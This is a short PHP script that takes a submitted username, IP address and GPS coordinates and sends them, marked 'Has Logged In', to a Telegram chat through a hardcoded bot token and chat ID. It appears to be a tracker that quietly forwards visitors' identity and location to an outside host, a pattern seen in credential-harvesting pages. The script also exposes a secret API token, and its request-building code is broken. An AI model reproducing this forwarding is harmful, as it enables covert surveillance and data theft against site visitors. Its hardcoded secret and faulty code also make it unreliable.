<?php
  $apiToken = "5885434176:AAEaQF0_ZXfCu30gWdYQTAooZePDGO_fcGs";
  $data = [
      'chat_id' => '-810564218',
      'text' => ''
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?$data" .
        http_build_query($data) );
  $txt = 'Has Logged In'. '<br>' . 'Username: '. $_POST['username']. '<br>' . 'IP Address: '. $_POST['ipAddress']. '<br>' . 'Location: '. $_POST['latitude'].','. $_POST['longitude'];

    if(isset($_POST['login'])){
    $apiToken = "5885434176:AAEaQF0_ZXfCu30gWdYQTAooZePDGO_fcGs";
    $data = [
        'chat_id' => '-810564218', 
        'text' => $txt
    ];
    $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?chat_id=-810564218&text=Test+Tele+API+Message" .
        http_build_query($data) );
    }    


    echo $txt;
?>